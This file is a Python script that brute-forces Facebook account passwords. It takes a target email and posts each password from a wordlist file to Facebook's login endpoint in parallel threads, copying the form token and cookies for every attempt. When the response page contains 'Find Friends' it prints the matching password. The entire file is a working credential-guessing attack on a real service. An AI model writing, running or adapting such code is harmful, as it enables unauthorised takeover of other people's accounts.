import requests
import threading
import urllib.request
import os
from bs4 import BeautifulSoup
post_url='https://www.facebook.com/login.php'

def function(email,passw,i):
        payload,cookie=create_form()
        payload['email']=email
        payload['pass']=passw
        #print('lsd : ',payload['lsd'])
        #print(cookie)
        r=requests.post(post_url,data=payload,cookies=cookie)
        if 'Find Friends' in r.text:
        	print('password is ',passw)
        	#open('d.html','w').write(r.text)
        	return True
        else:
                print(i,passw)
        return False

def create_form():
	form=dict()
	cookie={'fr':'07hJjVbDnGNx6xTea..BYlwm_.eH.AAA.0.0.BYlwrR.AWVJg_pv'}
	data=requests.get(post_url)
	#print('Form Creating : ',data.url)
	#print('Return Status : ',data.status_code)
	#for i in data.headers:
	#	print(i,' : ',data.headers[i])
	for i in data.cookies:
		cookie[i.name]=i.value
	data=BeautifulSoup(data.text,'html.parser').form
	if data.input['name']=='lsd':
		form['lsd']=data.input['value']
	return (form,cookie)

#payload=create_form()
print('___________________________________________________________________________\n')
file=open('passwords.txt','r')
i=0
email=input('Enter Email : ')
while file:
		passw=file.readline().strip()
		i+=1
		print(i,passw)		
		#payload['email']=email
		#payload['pass']=passw
		#if function(passw,payload):
		#	break
		threading.Thread(target=function,args=(email,passw,i)).start()
		if not i%10:
                        os.system('pause')
